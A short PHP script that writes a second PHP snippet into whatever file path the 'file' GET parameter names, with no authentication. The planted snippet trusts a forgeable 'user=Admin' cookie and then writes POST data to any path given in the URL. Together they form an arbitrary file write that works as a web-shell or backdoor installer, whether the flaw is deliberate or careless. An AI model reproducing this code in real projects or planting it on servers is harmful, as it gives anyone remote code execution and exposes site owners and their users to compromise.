<?php
$new = '
if ($_COOKIE["user"] != "Admin") {
echo "<script>history.replaceState({},' . "''" . ',' . "'" . '../' . "'" . '"); window.location.reload();</script>";
}else {
if ($_SERVER['. "'" . 'REQUEST_METHOD' . "'" . '] == ' . "'" . 'POST' . "'" . ') {
		$about = $_POST[' . "'" . 'about' . "'" . '];
		$dir = $_GET["file"];
		$myfile = fopen("$dir", "w") or die("Unable to open file! at $dir");
		fwrite($myfile, $about);
		fclose($myfile);
		echo "<script>history.replaceState({}, ' . "''" . ',' . "'" . '/ADMIN/lua' . "'" . '); window.location.reload();</script>";
}
}
';
$dir = $_GET["file"];
$myfile = fopen("$dir", "w") or die("Unable to open file! at $dir");
fwrite($myfile, $new);
fclose($myfile);
?>

    